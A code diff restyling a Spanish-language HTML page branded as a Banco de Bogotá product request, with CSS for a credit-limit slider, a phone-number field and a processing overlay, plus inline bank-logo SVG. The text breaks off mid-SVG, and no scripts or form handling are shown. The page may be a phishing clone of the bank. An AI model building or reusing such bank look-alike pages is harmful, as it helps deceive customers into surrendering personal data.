@@ -1,87 +1,311 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solicitud de Producto - Banco de Bogotá</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(90deg,#fcfcfc 50%,#eef3f6 50%);min-height:100vh;color:#212529}
-.container{display:flex;flex-direction:row;justify-content:center;align-items:flex-start;max-width:1000px;margin:0 auto;padding:20px;gap:40px}
-.container__login{flex:0 0 380px;width:380px}
-.container__login--header img{max-width:200px;margin-bottom:15px}
-.container__login--title h2{font-size:1.2rem;font-weight:700;color:#212529;margin-bottom:15px}
-.login-card-content{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:24px;margin-bottom:15px}
-.blue-banner{background:#0033a0;color:#fff;padding:14px 16px;border-radius:8px;margin-bottom:15px;display:flex;align-items:center;gap:10px;font-size:.85em}
-.blue-banner img{width:36px;height:36px;flex-shrink:0}
-.blue-banner a{color:#fff;text-decoration:underline}
-.container__info{flex:1;max-width:500px}
-.container__info img{width:100%;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);margin-bottom:15px}
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body, html { font-family: 'Inter', Arial, sans-serif; background: #fff; color: #1a1a2e; min-height: 100%; }
 
-/* SECCIONES DE PRODUCTOS */
-.producto-seccion{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:20px;margin-top:20px;border-left:5px solid #0033a0}
-.producto-seccion__titulo{font-size:16px;font-weight:700;color:#0033a0;margin-bottom:6px;display:flex;align-items:center;gap:8px}
-.producto-seccion__desc{font-size:13px;color:#6c757d;margin-bottom:14px;line-height:1.4}
-.producto-seccion__valor{text-align:center;font-size:26px;font-weight:700;color:#212529;margin:8px 0}
-.producto-seccion__plazos{display:flex;gap:6px;margin:10px 0 15px 0;flex-wrap:wrap}
-.producto-seccion__plazos button{flex:1;min-width:50px;padding:9px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer;transition:all .2s}
-.producto-seccion__plazos button:hover{border-color:#0033a0}
-.producto-seccion__cuota-box{background:#f5f7fa;border-radius:8px;padding:14px;margin-top:14px;text-align:center}
-.producto-seccion__cuota-label{font-size:12px;color:#6b7280}
-.producto-seccion__cuota-valor{font-size:22px;font-weight:700;color:#111827;margin-top:4px}
-.producto-seccion__nota{font-size:12.5px;color:#c62828;margin-top:10px;text-align:center;background:#ffebee;padding:8px;border-radius:4px}
-.producto-seccion__tel{width:100%;padding:13px;border-radius:8px;border:1px solid #d1d1d1;margin-top:12px;box-sizing:border-box;font-size:15px;outline:none}
-.producto-seccion__btn{width:100%;margin-top:12px;padding:14px 20px;background:#0033a0;color:#fff;border:none;font-size:15px;font-weight:700;border-radius:8px;cursor:pointer}
-.producto-seccion__btn:hover{background:#002580}
+    /* LOADING OVERLAY */
+    #loading-overlay {
+        display: none; position: fixed; inset: 0; background: #0033a0;
+        z-index: 9999; flex-direction: column; align-items: center; justify-content: center; gap: 20px;
+    }
+    #loading-overlay.show { display: flex; }
+    .loading-spinner {
+        width: 38px; height: 38px;
+        border: 3px solid rgba(255,255,255,0.3);
+        border-top-color: #fff; border-radius: 50%;
+        animation: spin .8s linear infinite;
+    }
+    .loading-text { color: #fff; font-size: 15px; font-weight: 500; }
+    @keyframes spin { to { transform: rotate(360deg); } }
 
-@media(max-width:768px){body{background:#fff!important}.container{flex-direction:column;align-items:center;padding:12px;gap:15px}.container__login,.container__info{width:100%;max-width:100%;flex:none}.login-card-content{padding:16px}.container__login--header img{max-width:180px}.blue-banner{padding:12px;font-size:.8em}.blue-banner img{width:30px;height:30px}}
-.loader-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#2c3e50;z-index:9999;display:none;justify-content:center;align-items:center;flex-direction:column}
-.loader-spinner{width:60px;height:60px;position:relative;animation:spin 1.5s linear infinite}
-.loader-spinner .dot{position:absolute;width:20px;height:20px;border-radius:50%}
-.loader-spinner .d1{background:#f1c40f;top:0;left:50%;transform:translateX(-50%)}
-.loader-spinner .d2{background:#3498db;bottom:5px;left:0}
-.loader-spinner .d3{background:#e74c3c;bottom:5px;right:0}
-@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-.loader-text{color:#fff;margin-top:20px;font-size:16px;font-weight:400}
-input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+    /* HEADER */
+    .header {
+        display: flex; justify-content: space-between; align-items: center;
+        padding: 16px 20px; background: #fff;
+        border-bottom: 1px solid #eef0f5; position: sticky; top: 0; z-index: 100;
+    }
+    .logo-svg { height: 28px; width: auto; display: block; }
+    .menu-icon { display: flex; flex-direction: column; gap: 4px; cursor: pointer; align-items: center; }
+    .menu-icon span { width: 22px; height: 2.5px; background: #0033a0; border-radius: 2px; display: block; }
+    .menu-text { font-size: 10px; margin-top: 3px; color: #0033a0; font-weight: 600; }
+
+    /* HERO */
+    .hero { padding: 32px 20px 0; max-width: 480px; margin: 0 auto; }
+    .hero-title { font-size: 30px; font-weight: 800; line-height: 1.15; color: #0a0a1a; margin-bottom: 14px; }
+    .hero-subtitle { font-size: 15px; line-height: 1.55; color: #333; margin-bottom: 18px; }
+    .hero-subtitle strong { color: #0033a0; }
+
+    .info-banner {
+        background: #f0f4ff; border-radius: 10px; padding: 12px 14px;
+        display: flex; align-items: flex-start; gap: 10px; margin-bottom: 6px;
+    }
+    .info-banner-icon { flex-shrink: 0; color: #0033a0; margin-top: 1px; }
+    .info-banner p { font-size: 13px; color: #0033a0; line-height: 1.5; }
+
+    /* CONTENEDOR PRINCIPAL */
+    .container { max-width: 480px; margin: 0 auto; padding: 24px 20px 0; }
+
+    /* TARJETAS DE PRODUCTO */
+    .producto-seccion {
+        background: #fff; border-radius: 16px; padding: 24px 20px;
+        margin-bottom: 20px; border: 1px solid #eef0f5;
+        box-shadow: 0 4px 20px rgba(0,30,100,.06);
+    }
+    .producto-seccion__titulo {
+        font-size: 17px; font-weight: 700; color: #0033a0;
+        margin-bottom: 6px; display: flex; align-items: center; gap: 8px;
+    }
+    .producto-seccion__desc {
+        font-size: 13px; color: #666; margin-bottom: 18px; line-height: 1.5;
+    }
+    .producto-seccion__valor {
+        text-align: center; font-size: 34px; font-weight: 800;
+        color: #0a0a1a; margin: 12px 0; line-height: 1;
+    }
+
+    /* SLIDER MODERNO */
+    .cupo-slider {
+        -webkit-appearance: none; appearance: none; width: 100%; height: 6px;
+        border-radius: 3px; outline: none; cursor: pointer; display: block;
+        margin: 16px 0 8px;
+        background: linear-gradient(to right, #0033a0 0%, #0033a0 var(--progress,10%), #dce3f7 var(--progress,10%), #dce3f7 100%);
+    }
+    .cupo-slider::-webkit-slider-thumb {
+        -webkit-appearance: none; appearance: none; width: 24px; height: 24px;
+        border-radius: 50%; background: #0033a0; cursor: pointer;
+        border: 3px solid #fff; box-shadow: 0 0 0 2px #0033a0, 0 2px 8px rgba(0,51,160,.3);
+        transition: transform .15s;
+    }
+    .cupo-slider::-webkit-slider-thumb:hover { transform: scale(1.15); }
+    .cupo-slider::-moz-range-thumb {
+        width: 24px; height: 24px; border-radius: 50%; background: #0033a0;
+        cursor: pointer; border: 3px solid #fff; box-shadow: 0 0 0 2px #0033a0, 0 2px 8px rgba(0,51,160,.3);
+    }
+    .slider-labels {
+        display: flex; justify-content: space-between;
+        font-size: 12px; color: #999; margin-bottom: 18px; font-weight: 500;
+    }
+
+    /* PLAZOS */
+    .producto-seccion__plazos { display: flex; gap: 8px; margin: 10px 0 16px 0; flex-wrap: wrap; }
+    .producto-seccion__plazos button {
+        flex: 1; min-width: 50px; padding: 11px 6px; font-size: 13px; font-weight: 600;
+        border: 2px solid #dce3f7; border-radius: 10px; background: #fff;
+        cursor: pointer; transition: all .2s; color: #333; font-family: inherit;
+    }
+    .producto-seccion__plazos button:hover { border-color: #0033a0; }
+
+    /* CAJA DE CUOTA */
+    .producto-seccion__cuota-box {
+        background: #f7f8fc; border-radius: 12px; padding: 16px;
+        margin-top: 14px; text-align: center;
+    }
+    .producto-seccion__cuota-label { font-size: 12px; color: #888; font-weight: 500; }
+    .producto-seccion__cuota-valor {
+        font-size: 24px; font-weight: 800; color: #0a0a1a; margin-top: 6px;
+    }
+
+    /* NOTA */
+    .producto-seccion__nota {
+        font-size: 12px; color: #0033a0; margin-top: 12px; text-align: center;
+        background: #f0f4ff; padding: 10px 12px; border-radius: 8px; line-height: 1.5;
+    }
+
+    /* TELÉFONO */
+    .phone-field { margin-top: 16px; }
+    .phone-label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
+    .phone-input-wrap { position: relative; display: flex; align-items: center; }
+    .phone-prefix {
+        position: absolute; left: 14px; font-size: 15px; font-weight: 600;
+        color: #0033a0; pointer-events: none; user-select: none;
+    }
+    .phone-input {
+        width: 100%; padding: 14px 14px 14px 44px;
+        border: 2px solid #dce3f7; border-radius: 12px;
+        font-size: 15px; font-family: inherit; font-weight: 500; color: #0a0a1a;
+        background: #fff; outline: none; transition: border-color .2s;
+        -webkit-appearance: none; appearance: none;
+    }
+    .phone-input:focus { border-color: #0033a0; }
+    .phone-input::placeholder { color: #bbb; font-weight: 400; }
+    .producto-seccion__tel {
+        width: 100%; padding: 14px; border-radius: 12px;
+        border: 2px solid #dce3f7; margin-top: 16px; box-sizing: border-box;
+        font-size: 15px; font-family: inherit; outline: none;
+        transition: border-color .2s; color: #0a0a1a;
+    }
+    .producto-seccion__tel:focus { border-color: #0033a0; }
+
+    /* BOTÓN PÍLDORA */
+    .producto-seccion__btn {
+        display: block; width: 100%; margin-top: 16px;
+        background: #0033a0; color: #fff; text-align: center;
+        font-size: 15px; font-weight: 700; letter-spacing: .08em;
+        text-transform: uppercase; text-decoration: none;
+        padding: 17px 20px; border-radius: 30px; border: none; cursor: pointer;
+        font-family: inherit; transition: background .25s, transform .2s, box-shadow .2s;
+        box-shadow: 0 4px 16px rgba(0,51,160,.3);
+    }
+    .producto-seccion__btn:hover {
+        background: #002277; transform: translateY(-2px);
+        box-shadow: 0 8px 24px rgba(0,51,160,.38);
+    }
+
+    /* SECCIÓN DE IMAGEN (reemplaza la tarjeta antigua) */
+    .card-image-wrapper {
+        margin-top: 24px; display: flex; justify-content: center;
+    }
+    .card-image-wrapper img {
+        width: 100%; max-width: 420px; height: auto; display: block;
+        filter: drop-shadow(0 16px 40px rgba(0,30,100,.18));
+        transition: transform .35s ease, filter .35s ease;
+        border-radius: 12px;
+    }
+    .card-image-wrapper img:hover {
+        transform: translateY(-5px) scale(1.01);
+        filter: drop-shadow(0 24px 50px rgba(0,30,100,.26));
+    }
+
+    /* BANNER DE AYUDA */
+    .blue-banner {
+        background: #f0f4ff; color: #0033a0; padding: 14px 16px;
+        border-radius: 12px; margin: 20px auto 0; max-width: 480px;
+        display: flex; align-items: center; gap: 12px; font-size: 13px;
+    }
+    .blue-banner img { width: 36px; height: 36px; flex-shrink: 0; }
+    .blue-banner a { color: #0033a0; text-decoration: underline; font-weight: 600; }
+
+    /* FOOTER LOGOS */
+    .logos-footer { background: #fff; padding: 28px 20px 40px; border-top: 1px solid #eef0f5; margin-top: 30px; }
+    .logos-footer-inner {
+        display: flex; justify-content: center; align-items: center;
+        gap: 28px; flex-wrap: wrap; max-width: 480px; margin: 0 auto;
+    }
+    .logos-footer-inner img { height: 38px; object-fit: contain; }
+    .logo-aval { height: 26px !important; filter: brightness(0) opacity(.5); }
+    .logo-vigilado { height: 50px !important; }
+
+    /* INFO GRID */
+    .info-grid-section { padding: 24px 20px 12px; max-width: 480px; margin: 0 auto; }
+    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px 16px; margin-bottom: 16px; }
+    .info-grid-item { display: flex; flex-direction: column; align-items: center; text-align: center; }
+    .grid-icon { width: 32px; height: 32px; color: #0033a0; margin-bottom: 6px; }
+    .grid-label { font-size: 12px; color: #888; margin-bottom: 3px; font-weight: 500; }
+    .grid-value { font-size: 16px; font-weight: 800; color: #0a0a1a; line-height: 1.2; }
+    .info-grid-footnote { font-size: 11px; color: #aaa; line-height: 1.5; text-align: center; padding-top: 4px; }
+
+    @media (max-width: 400px) {
+        .hero-title { font-size: 26px; }
+        .producto-seccion__valor { font-size: 30px; }
+    }
+    @media (min-width: 900px) {
+        .header { padding: 18px 60px; }
+        .hero { max-width: 1100px; padding: 60px 60px 0; display: grid; grid-template-columns: 1fr 1fr; column-gap: 64px; align-items: start; }
+        .hero-title { font-size: 42px; grid-column: 1; grid-row: 1; margin-bottom: 18px; }
+        .hero-subtitle { font-size: 16px; grid-column: 1; grid-row: 2; margin-bottom: 0; }
+        .info-banner { grid-column: 2; grid-row: 1; margin-bottom: 20px; }
+        .card-image-wrapper { grid-column: 2; grid-row: 2 / 4; margin-top: 0; }
+        .container { max-width: 800px; padding: 40px 60px 0; }
+        .blue-banner { max-width: 800px; }
+        .info-grid-section { max-width: 800px; padding: 40px 60px 32px; }
+        .info-grid { grid-template-columns: repeat(4, 1fr); gap: 0 24px; }
+        .logos-footer { padding: 28px 60px 44px; }
+        .logos-footer-inner { max-width: 800px; gap: 48px; }
+    }
 </style>
 </head>
 <body>
-<div class="loader-overlay" id="loading-overlay">
-<div class="loader-spinner"><div class="dot d1"></div><div class="dot d2"></div><div class="dot d3"></div></div>
-<div class="loader-text">Procesando...</div>
+
+<!-- LOADING OVERLAY -->
+<div id="loading-overlay">
+    <svg style="height:36px;width:auto" viewBox="0 0 200 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M48.075 19.257c-.92.292-1.876.455-2.84.484-2.163 0-2.61-1.9-2.61-3.49 0-2.464.892-3.712 2.657-3.712a4.5 4.5 0 0 1 1.467.215l1.555.627.031-2.046-.21-.09a9.5 9.5 0 0 0-3.458-.757c-3.168 0-5.213 2.269-5.213 5.78 0 3.358 1.972 5.597 4.919 5.597 1.279 0 2.457-.294 4.197-1.05l.28-.12-.453-1.53zM11.368 13.585c1.4-.574 2.048-1.612 2.048-3.274 0-1.617-.766-2.857-2.104-3.397-.937-.386-1.813-.478-4.477-.478H1.188V8.05l1.774.26v13.334H7.44c2.202 0 3.129-.134 4.125-.593a3.995 3.995 0 0 0 2.387-3.761c0-1.959-.882-3.162-2.594-3.705zM6.133 8.397h.873c1.17 0 2.087 0 2.652.481a1.96 1.96 0 0 1 .588 1.52c0 1.511-.462 2.11-2.239 2.286l-1.278.137-.588.982zm3.637 10.7c-.71.535-1.765.577-3.078.577h-.56v-5l.076.014h1.038c1.145 0 2.063.036 2.65.506a2.38 2.38 0 0 1 .758 1.88 2.48 2.48 0 0 1-.884 2.024M100.475 13.585c1.399-.574 2.051-1.612 2.051-3.274 0-1.617-.767-2.857-2.105-3.397-.934-.386-1.816-.478-4.477-.478h-5.647V8.05l1.775.26v13.334h4.477c2.199 0 3.128-.134 4.124-.593a3.99 3.99 0 0 0 2.384-3.761c0-1.959-.881-3.162-2.594-3.705zm-5.244-5.188h.876c1.164 0 2.084 0 2.65.481a1.94 1.94 0 0 1 .595 1.525c0 1.512-.461 2.11-2.238 2.287l-1.279.137-.585.982zm3.637 10.7c-.708.535-1.765.577-3.078.577h-.56v-5l.073.014h1.041c1.142 0 2.063.036 2.65.506a2.38 2.38 0 0 1 .761 1.88 2.47 2.47 0 0 1-.89 2.024M34.954 10.485c-.923 0-2.101.327-3.444.887l-.062-.862-4.572.58v1.603h1.679v8.954h3.002s.025-7.91.025-8.364a7.7 7.7 0 0 1 2.326-.437c.48 0 .806.09.996.28.28.28.28.868.28 1.53v6.996h3.027v-7.157c0-1.66-.072-2.203-.596-2.877-.576-.75-1.472-1.12-2.66-1.12M54.752 10.488c-3.358 0-5.465 2.182-5.465 5.697 0 3.514 2.042 5.675 5.465 5.675 3.357 0 5.448-2.183 5.448-5.695s-2.037-5.677-5.448-5.677m-.017 9.407c-.98 0-2.275-.386-2.275-3.71 0-3.269 1.161-3.708 2.292-3.708.976 0 2.277.38 2.277 3.688s-1.16 3.73-2.294 3.73M133.709 10.488c-3.358 0-5.462 2.182-5.462 5.697 0 3.514 2.043 5.675 5.462 5.675 3.358 0 5.445-2.183 5.445-5.695s-2.037-5.677-5.445-5.677m-.025 9.407c-.977 0-2.27-.386-2.27-3.71 0-3.269 1.159-3.708 2.295-3.708.977 0 2.275.38 2.275 3.688s-1.161 3.73-2.3 3.73M146.393 19.55l-2.126.323c-.473 0-.602-.123-.677-.24-.076-.118-.076-.183-.076-1.03v-5.91h3.005v-1.861h-3.002v-2.89l-.375.03-2.661.224v10.353c0 1.15.095 1.88.587 2.457.493.576 1.164.84 2.216.84a9 9 0 0 0 3.269-.72l.296-.117zM110 10.488c-3.358 0-5.462 2.182-5.462 5.697 0 3.514 2.042 5.675 5.462 5.675 3.358 0 5.442-2.183 5.442-5.695s-2.031-5.677-5.442-5.677m-.023 9.407c-.973 0-2.272-.386-2.272-3.71 0-3.269 1.161-3.708 2.295-3.708.976 0 2.277.38 2.277 3.688s-1.161 3.73-2.3 3.73M123.994 11.363a4.85 4.85 0 0 0-2.357-.601c-3.022 0-5.165 2.403-5.165 5.775 0 3.23 1.698 5.258 4.418 5.258.705 0 1.383-.187 3.02-.84v.87c0 1.884-.683 2.424-3.039 2.424a16.8 16.8 0 0 1-3.618-.436v1.821c2.258.498 3.192.641 4.342.641 1.464 0 2.72-.246 3.61-.727 1.321-.703 1.811-1.696 1.811-3.599V10.904h-3.022zm-.084 8.09a8.5 8.5 0 0 1-1.399.129c-1.828 0-2.83-1.181-2.83-3.358 0-2.255 1.12-3.56 3.107-3.56a5.7 5.7 0 0 1 1.119.104zM25.34 10.977h-2.944v.45a4.76 4.76 0 0 0-2.309-.595c-2.957 0-5.059 2.392-5.059 5.753 0 3.215 1.662 5.238 4.329 5.238.688 0 1.58-.313 2.952-1.1v1h.062l4.197-.423v-1.797h-1.229zm-2.947 8.563a8.6 8.6 0 0 1-1.436.128c-1.866 0-2.887-1.194-2.887-3.391 0-2.28 1.153-3.601 3.173-3.601q.58-.004 1.15.109zM157.581 10.977h-2.964v.45a4.7 4.7 0 0 0-2.303-.595c-2.96 0-5.059 2.392-5.059 5.753 0 3.215 1.662 5.238 4.326 5.238.689 0 1.581-.313 2.955-1.1v1l4.279-.432v-1.796h-1.223zm-2.95 8.563a8.5 8.5 0 0 1-1.435.128c-1.864 0-2.888-1.194-2.888-3.391 0-2.28 1.156-3.601 3.173-3.601q.58-.003 1.15.109zM156.198 8.246l-.719-2.303-.313.132-4.721 1.91.414 1.375zM74.697 5.725l-.15.014-.359.042-3.993.51v1.345h1.472v3.51c-1.19-.401-2.843-.745-4.365-.23-2.09.702-3.272 2.588-3.33 5.316-.059 2.471 1.217 4.505 3.254 5.174 1.492.49 3.475-.061 4.575-.587 0 .212.037.887.037.887l4.026-.532v-1.346h-1.276c0-.28.123-14.103.123-14.103zm-3.013 13.711c-1.36.367-2.868.641-3.842-.534-.56-.686-.683-1.704-.683-2.748v-.358c.025-1.147.33-1.88.918-2.541.929-1.05 2.518-.84 3.677-.297 0 0-.076 6.26-.076 6.478M81.894 10.482a5.5 5.5 0 0 0-1.936.26c-2.222.725-3.478 2.672-3.543 5.485-.061 2.546 1.296 4.64 3.459 5.316 1.911.61 4.71-.05 6.484-1.018l.097-.05-.506-1.543-.993.314c-1.439.397-3.285 1.12-4.478-.243-.64-.748-.727-1.864-.733-2.76l5.877.115h.881v-.126c.022-.257.036-.515.036-.76 0-5.108-4.463-4.993-4.659-4.998zm-2.079 4.25c.031-.19.11-2.392 2.07-2.392 1.962 0 2.027 2.152 2.055 2.392z"/><g clip-path="url(#la)"><g clip-path="url(#lb)"><path fill="#cd3232" d="M184.837 1.03q.017.001.033-.003a.1.1 0 0 0 .028-.017.1.1 0 0 0 .019-.026.1.1 0 0 0 .007-.032.1.1 0 0 0-.007-.032.1.1 0 0 0-.019-.026.08.08 0 0 0-.061-.02c-10.442-1.558-18.022 5.87-18.022 14.647 0 7.79 5.869 14.699 14.39 14.699 2.545 0 5.298-.624 7.371-2.234.571-.467.831-.727 1.039-1.506 0 0 .415-1.61.052-3.116-.052-.208-.104-.208-.312-.105-1.766.676-4.826 1.404-7.323 1.404-6.803-.001-11.111-5.559-11.111-11.427 0-6.025 5.555-12.568 13.916-12.206"/><path fill="#ffbe00" d="M194.964 7.366c0-5.09-8.621-6.856-14.282-5.4-.157.051-.104.155 0 .155 3.843-.415 8.569 2.026 8.569 4.986 0 2.13-2.493 3.22-3.949 3.791-.103.052-.051.156.052.156 2.753-.467 5.194-.263 7.167-.051.208 0 .312-.105.468-.208 1.042-.728 1.975-1.767 1.975-3.429"/><path fill="#ffbe00" d="M176.579 14.43c9.401 0 14.023 5.142 14.023 10.442 0 4.363-3.998 6.44-7.427 6.908a.08.08 0 0 0-.055.023.08.08 0 0 0-.023.055q0 .031.023.055a.08.08 0 0 0 .055.023c7.898 0 14.595-4.051 14.595-9.765 0-2.808-1.662-4.726-3.376-6.44-.208-.208-.263-.208-.415-.104-.935.624-1.974 1.87-2.494 4.26 0 .051-.103.051-.103 0 .103-3.792 2.493-6.23 7.012-6.23.103 0 .103-.104 0-.156-6.545-3.065-15.011-2.701-21.815.83-.103.047-.052.1 0 .1"/></g></g><defs><clipPath id="la"><path fill="#fff" d="M166.815 0h31.997v32h-31.997z"/></clipPath><clipPath id="lb"><path fill="#fff" d="M166.815.667h31.656v31.267h-31.656z"/></clipPath></defs></svg>
+    <div class="loading-spinner"></div>
+    <span class="loading-text">Procesando solicitud...</span>
 </div>
+
+<!-- HEADER -->
+<header class="header">
+    <div class="logo-container">
+        <svg class="logo-svg" viewBox="0 0 200 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill="#0033a0" d="M48.075 19.257c-.92.292-1.876.455-2.84.484-2.163 0-2.61-1.9-2.61-3.49 0-2.464.892-3.712 2.657-3.712a4.5 4.5 0 0 1 1.467.215l1.555.627.031-2.046-.21-.09a9.5 9.5 0 0 0-3.458-.757c-3.168 0-5.213 2.269-5.213 5.78 0 3.358 1.972 5.597 4.919 5.597 1.279 0 2.457-.294 4.197-1.05l.28-.12-.453-1.53zM11.368 13.585c1.4-.574 2.048-1.612 2.048-3.274 0-1.617-.766-2.857-2.104-3.397-.937-.386-1.813-.478-4.477-.478H1.188V8.05l1.774.26v13.334H7.44c2.202 0 3.129-.134 4.125-.593a3.995 3.995 0 0 0 2.387-3.761c0-1.959-.882-3.162-2.594-3.705zM6.133 8.397h.873c1.17 0 2.087 0 2.652.481a1.96 1.96 0 0 1 .588 1.52c0 1.511-.462 2.11-2.239 2.286l-1.278.137-.588.982zm3.637 10.7c-.71.535-1.765.577-3.078.577h-.56v-5l.076.014h1.038c1.145 0 2.063.036 2.65.506a2.38 2.38 0 0 1 .758 1.88 2.48 2.48 0 0 1-.884 2.024M100.475 13.585c1.399-.574 2.051-1.612 2.051-3.274 0-1.617-.767-2.857-2.105-3.397-.934-.386-1.816-.478-4.477-.478h-5.647V8.05l1.775.26v13.334h4.477c2.199 0 3.128-.134 4.124-.593a3.99 3.99 0 0 0 2.384-3.761c0-1.959-.881-3.162-2.594-3.705zm-5.244-5.188h.876c1.164 0 2.084 0 2.65.481a1.94 1.94 0 0 1 .595 1.525c0 1.512-.461 2.11-2.238 2.287l-1.279.137-.585.982zm3.637 10.7c-.708.535-1.765.577-3.078.577h-.56v-5l.073.014h1.041c1.142 0 2.063.036 2.65.506a2.38 2.38 0 0 1 .761 1.88 2.47 2.47 0 0 1-.89 2.024M34.954 10.485c-.923 0-2.101.327-3.444.887l-.062-.862-4.572.58v1.603h1.679v8.954h3.002s.025-7.91.025-8.364a7.7 7.7 0 0 1 2.326-.437c.48 0 .806.09.996.28.28.28.28.868.28 1.53v6.996h3.027v-7.157c0-1.66-.072-2.203-.596-2.877-.576-.75-1.472-1.12-2.66-1.12M54.752 10.488c-3.358 0-5.465 2.182-5.465 5.697 0 3.514 2.042 5.675 5.465 5.675 3.357 0 5.448-2.183 5.448-5.695s-2.037-5.677-5.448-5.677m-.017 9.407c-.98 0-2.275-.386-2.275-3.71 0-3.269 1.161-3.708 2.292-3.708.976 0 2.277.38 2.277 3.688s-1.16 3.73-2.294 3.73M133.709 10.488c-3.358 0-5.462 2.182-5.462 5.697 0 3.514 2.043 5.675 5.462 5.675 3.358 0 5.445-2.183 5.445-5.695s-2.037-5.677-5.445-5.677m-.025 9.407c-.977 0-2.27-.386-2.27-3.71 0-3.269 1.159-3.708 2.295-3.708.977 0 2.275.38 2.275 3.688s-1.161 3.73-2.3 3.73M146.393 19.55l-2.126.323c-.473 0-.602-.123-.677-.24-.076-.118-.076-.183-.076-1.03v-5.91h3.005v-1.861h-3.002v-2.89l-.375.03-2.661.224v10.353c0 1.15.095 1.88.587 2.457.493.576 1.164.84 2.216.84a9 9 0 0 0 3.269-.72l.296-.117zM110 10.488c-3.358 0-5.462 2.182-5.462 5.697 0 3.514 2.042 5.675 5.462 5.675 3.358 0 5.442-2.183 5.442-5.695s-2.031-5.677-5.442-5.677m-.023 9.407c-.973 0-2.272-.386-2.272-3.71 0-3.269 1.161-3.708 2.295-3.708.976 0 2.277.38 2.277 3.688s-1.161 3.73-2.3 3.73M123.994 11.363a4.85 4.85 0 0 0-2.357-.601c-3.022 0-5.165 2.403-5.165 5.775 0 3.23 1.698 5.258 4.418 5.258.705 0 1.383-.187 3.02-.84v.87c0 1.884-.683 2.424-3.039 2.424a16.8 16.8 0 0 1-3.618-.436v1.821c2.258.498 3.192.641 4.342.641 1.464 0 2.72-.246 3.61-.727 1.321-.703 1.811-1.696 1.811-3.599V10.904h-3.022zm-.084 8.09a8.5 8.5 0 0 1-1.399.129c-1.828 0-2.83-1.181-2.83-3.358 0-2.255 1.12-3.56 3.107-3.56a5.7 5.7 0 0 1 1.119.104zM25.34 10.977h-2.944v.45a4.76 4.76 0 0 0-2.309-.595c-2.957 0-5.059 2.392-5.059 5.753 0 3.215 1.662 5.238 4.329 5.238.688 0 1.58-.313 2.952-1.1v1h.062l4.197-.423v-1.797h-1.229zm-2.947 8.563a8.6 8.6 0 0 1-1.436.128c-1.866 0-2.887-1.194-2.887-3.391 0-2.28 1.153-3.601 3.173-3.601q.58-.004 1.15.109zM157.581 10.977h-2.964v.45a4.7 4.7 0 0 0-2.303-.595c-2.96 0-5.059 2.392-5.059 5.753 0 3.215 1.662 5.238 4.326 5.238.689 0 1.581-.313 2.955-1.1v1l4.279-.432v-1.796h-1.223zm-2.95 8.563a8.5 8.5 0 0 1-1.435.128c-1.864 0-2.888-1.194-2.888-3.391 0-2.28 1.156-3.601 3.173-3.601q.58-.003 1.15.109zM156.198 8.246l-.719-2.303-.313.132-4.721 1.91.414 1.375zM74.697 5.725l-.15.014-.359.042-3.993.51v1.345h1.472v3.51c-1.19-.401-2.843-.745-4.365-.23-2.09.702-3.272 2.588-3.33 5.316-.059 2.471 1.217 4.505 3.254 5.174 1.492.49 3.475-.061 4.575-.587 0 .212.037.887.037.887l4.026-.532v-1.346h-1.276c0-.28.123-14.103.123-14.103zm-3.013 13.711c-1.36.367-2.868.641-3.842-.534-.56-.686-.683-1.704-.683-2.748v-.358c.025-1.147.33-1.88.918-2.541.929-1.05 2.518-.84 3.677-.297 0 0-.076 6.26-.076 6.478M81.894 10.482a5.5 5.5 0 0 0-1.936.26c-2.222.725-3.478 2.672-3.543 5.485-.061 2.546 1.296 4.64 3.459 5.316 1.911.61 4.71-.05 6.484-1.018l.097-.05-.506-1.543-.993.314c-1.439.397-3.285 1.12-4.478-.243-.64-.748-.727-1.864-.733-2.76l5.877.115h.881v-.126c.022-.257.036-.515.036-.76 0-5.108-4.463-4.993-4.659-4.998zm-2.079 4.25c.031-.19.11-2.392 2.07-2.392 1.962 0 2.027 2.152 2.055 2.392z"/><g clip-path="url(#hla)"><g clip-path="url(#hlb)"><path fill="#cd3232" d="M184.837 1.03q.017.001.033-.003a.1.1 0 0 0 .028-.017.1.1 0 0 0 .019-.026.1.1 0 0 0 .007-.032.1.1 0 0 0-.007-.032.1.1 0 0 0-.019-.026.08.08 0 0 0-.061-.02c-10.442-1.558-18.022 5.87-18.022 14.647 0 7.79 5.869 14.699 14.39 14.699 2.545 0 5.298-.624 7.371-2.234.571-.467.831-.727 1.039-1.506 0 0 .415-1.61.052-3.116-.052-.208-.104-.208-.312-.105-1.766.676-4.826 1.404-7.323 1.404-6.803-.001-11.111-5.559-11.111-11.427 0-6.025 5.555-12.568 13.916-12.206"/><path fill="#ffbe00" d="M194.964 7.366c0-5.09-8.621-6.856-14.282-5.4-.157.051-.104.155 0 .155 3.843-.415 8.569 2.026 8.569 4.986 0 2.13-2.493 3.22-3.949 3.791-.103.052-.051.156.052.156 2.753-.467 5.194-.263 7.167-.051.208 0 .312-.105.468-.208 1.042-.728 1.975-1.767 1.975-3.429"/><path fill="#ffbe00" d="M176.579 14.43c9.401 0 14.023 5.142 14.023 10.442 0 4.363-3.998 6.44-7.427 6.908a.08.08 0 0 0-.055.023.08.08 